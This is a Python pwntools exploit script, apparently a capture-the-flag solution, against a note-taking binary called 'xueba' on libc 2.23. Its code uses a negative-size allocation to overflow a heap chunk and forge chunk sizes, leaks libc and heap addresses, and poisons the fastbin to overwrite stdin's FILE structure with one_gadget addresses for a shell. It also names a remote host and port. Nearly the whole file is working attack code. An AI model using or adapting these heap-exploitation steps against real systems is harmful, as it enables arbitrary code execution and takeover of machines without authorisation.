#coding:utf-8
from pwn import *
import sys
import time

file_addr='./xueba'
libc_addr='./libc-2.23.so'
host='202.1.22.12'
port=40003


is_tmux=''
is_libc=''
is_debug=''
log_level=''
#  p=remote('202.1.22.12',40003)
p=process(file_addr,env={"LD_PRELOAD":libc_addr})
if is_debug=='1':
    gdb.attach(p)



def menu(op):
    p.sendlineafter('Exit',str(op))


def show(index):
    menu(2)
    p.sendlineafter('Index:',str(index))

def add_note(num,name,con):
    menu(1)
    p.sendlineafter('your note?',str(num))
    p.sendlineafter('content:',name)
    time.sleep(0.1)
    p.sendline(con)
    time.sleep(0.1)

def del_note(index):
    menu(3)
    p.sendlineafter('Index:',str(index))

def change_name(index,src,des):
    menu(4)
    p.sendlineafter('Index:',str(index))
    p.recvuntil('to change?')
    p.send(src)
    time.sleep(0.1)
    p.send(des)
    time.sleep(0.1)



#0
add_note(10,'1'*8,'1'*8)
#1
add_note(0x80,'2'*8,'2'*8)
#2
add_note(10,'3'*8,'3'*8)
#3
add_note(10,'3'*8,'3'*8)

del_note(0)
payload='a'*0x10
payload+=p64(0)+p64(0xb1)
#0
add_note(-1,'1'*8,payload)

del_note(1)
#1
add_note(0x80,'2'*8,'2'*8)



show(2)
p.recvuntil('Content:')
leak=u64(p.recvline().strip().ljust(8,'\x00'))
libc_base=leak-0x3c4b78
system_addr=libc_base+0x0000000000045390
io_stdin=libc_base+0x00000000003c48e0
p.info('leak '+hex(leak))
p.info('libc_base '+hex(libc_base))
p.info('io_stdin '+hex(io_stdin))
p.info('system_addr '+hex(system_addr))
#4
add_note(10,'z'*8,'z'*8)
one_gadget=libc_base+0xf0274
##one_gadget=libc_base+0xf1117

del_note(3)
del_note(2)
show(4)
p.recvuntil('Content:')
heap_leak=u64(p.recvline().strip().ljust(8,'\x00'))
p.info('heap_leak '+hex(heap_leak))
del_note(1)
payload=p64(one_gadget)*8
add_note(0x60-1,'3'*8,payload)
del_note(1)
#
del_note(0)
payload='a'*0x10
payload+=p64(0)+p64(0x71)
payload+=p64(io_stdin+0x60-3+0x40)
add_note(-1,'1'*8,payload)
add_note(0x60-1,'3'*8,'3'*8)
#


#
payload='z'*3
payload+=p64(0)+p64(0)
payload+=p64(0x00000000ffffffff)+p64(0)
payload+=p64(0)+p64(heap_leak-0xe0+0x50)
add_note(0x60-1,'3'*8,payload)
#menu(1)
#p.sendlineafter('your note?',str(-1))
raw_input()
p.interactive()
